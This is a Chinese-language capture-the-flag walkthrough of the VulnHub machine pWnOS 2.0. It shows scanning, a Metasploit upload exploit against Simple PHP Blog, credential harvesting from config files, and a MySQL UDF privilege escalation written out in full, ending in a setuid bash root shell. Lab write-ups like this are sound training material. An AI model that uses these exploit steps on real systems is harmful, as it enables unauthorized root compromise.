# pWnOS: 2.0 (Pre-Release)

2024-4-22 https://www.vulnhub.com/entry/pwnos-20-pre-release,34/

difficulty: easy to intermediate

## IP

10.10.10.100

## Scan

Open Port -> 22,80

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.8p1 Debian 1ubuntu3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 85d32b0109427b204e30036dd18f95ff (DSA)
|   2048 307a319a1bb817e715df89920ecd5828 (RSA)
|_  256 1012644b7dff6a87372638b1449fcf5e (ECDSA)
80/tcp open  http    Apache httpd 2.2.17 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: Welcome to this Site!
|_http-server-header: Apache/2.2.17 (Ubuntu)
```

22 不允许匿名登陆，先看看 80 的 web 上有什么信息。

对 web 服务进行目录扫描，发现了一些目录信息：

```
http://10.10.10.100/login.php            (Status: 200) [Size: 1174]
http://10.10.10.100/login                (Status: 200) [Size: 1174]
http://10.10.10.100/register             (Status: 200) [Size: 1562]
http://10.10.10.100/register.php         (Status: 200) [Size: 1562]
http://10.10.10.100/info.php             (Status: 200) [Size: 49885]
http://10.10.10.100/info                 (Status: 200) [Size: 49873]
http://10.10.10.100/index                (Status: 200) [Size: 854]
http://10.10.10.100/index.php            (Status: 200) [Size: 854]
http://10.10.10.100/includes             (Status: 200) [Size: 1524]
http://10.10.10.100/blog                 (Status: 200) [Size: 8094]
http://10.10.10.100/activate.php         (Status: 200) [Size: 854]
http://10.10.10.100/activate             (Status: 200) [Size: 854]
```

其中 http://10.10.10.100/info.php 是一个 phpinfo 页面，我们可以从中了解到更多 php 的配置信息。

http://10.10.10.100/blog/ 显示了一个 blog 页面，http://10.10.10.100/blog/docs/INSTALL.TXT 显示了这个 CMS 的名字：Simple PHP Blog 0.4.0

搜索看能否找到相关的利用漏洞？ 在 msf 中有对应的 rce 利用漏洞：unix/webapp/sphpblog_file_upload ， 设置好相关 options 参数后，exploit 执行，得到了 meterpreter。

进入到系统 shell 执行环境下，使用 linpeas 对系统进行相关枚举，/home 目录中存在一个 dan 用户，同时发现系统还有一个 mysql 用户是超级用户。

发现了一个目录中可能存在敏感信息 /var/www/blog/config/password.txt：

```
www-data@web:/var/www/blog/config$ cat password.txt
cat password.txt
$1$weWj5iAZ$NU4CkeZ9jNtcP/qrPC69a/
```

但是这个哈希值无法爆破，找不到对应的明文。

在 /var/mysqli_connect.php 中获得了数据库的连接信息：

```
DEFINE ('DB_USER', 'root');
DEFINE ('DB_PASSWORD', 'root@ISIntS');
DEFINE ('DB_HOST', 'localhost');
DEFINE ('DB_NAME', 'ch16');
```

在 /var/www/mysqli_connect.php 中获得了数据库的连接信息：

```
DEFINE ('DB_USER', 'root');
DEFINE ('DB_PASSWORD', 'goodday');
DEFINE ('DB_HOST', 'localhost');
DEFINE ('DB_NAME', 'ch16');
```

同时发现 mysqld 是以 root 用户权限运行的，可能存在 UDF 提权。

尝试用上面得到的 2 个数据库信息，登陆 mysql 数据库，发现第一个凭据是能够登陆的：root:root@ISIntS。

## root 方法 1

使用上面得到的用户数据库密码，可以直接 su root，直接获得了最高的权限。

## root 方法 2

从 users 表中得到了管理员的信息：

```
mysql> select * from users;
select * from users;
+---------+------------+-----------+------------------+------------------------------------------+------------+----------------------------------+---------------------+
| user_id | first_name | last_name | email            | pass                                     | user_level | active                           | registration_date   |
+---------+------------+-----------+------------------+------------------------------------------+------------+----------------------------------+---------------------+
|       1 | Dan        | Privett   | admin@isints.com | c2c4b4e51d9e23c02c15702c136c3e950ba9a4af |          0 | NULL                             | 2011-05-07 17:27:01 |
+---------+------------+-----------+------------------+------------------------------------------+------------+----------------------------------+---------------------+
```

让我们尝试获得 dan 这个用户的明文密码：killerbeesareflying ，下面用这个密码 su 尝试切换到 dan 用户下，但是发现密码不对，只能尝试别的攻击面。

发现 mysql 是以 root 用户权限在运行，尝试 UDF 提权，先查询下目标数据库的配置是否满足相关 UDF 要求：

```
mysql> show variables like '%sec%';
show variables like '%sec%';
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_auth      | OFF   |
| secure_file_priv |       |
+------------------+-------+
2 rows in set (0.00 sec)

mysql> show variables like '%plugin%';
show variables like '%plugin%';
+---------------+-----------------------+
| Variable_name | Value                 |
+---------------+-----------------------+
| plugin_dir    | /usr/lib/mysql/plugin |
+---------------+-----------------------+
1 row in set (0.00 sec)
```

满足相关要求，让我们进行 udf 写入：

```bash
searchsploit mysql udf
searchsploit -m 1518
mv 1518.c raptor_udf2.c
```

将上面的 udf 源码，wget 到目标机器进行编译:

```sql
gcc -o raptor_udf2.so -shared -fPIC raptor_udf2.c

mysql -uroot -proot@ISIntS
use mysql;
create table foo(line blob);
insert into foo values(load_file('/tmp/raptor_udf2.so'));

select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';   <-- 这里注意路径要设置为对应的plugin目录
create function do_system returns integer soname 'raptor_udf2.so';

select * from mysql.func;

select do_system('cp /bin/bash /tmp/bash; chmod +xs /tmp/bash');
```

执行 /tmp/bash 最终获得了 root 权限：

```bash
www-data@web:/tmp$ ./bash -p
./bash -p
bash-4.2# id
id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
```

没有尝试内核版本对应的提权方式。
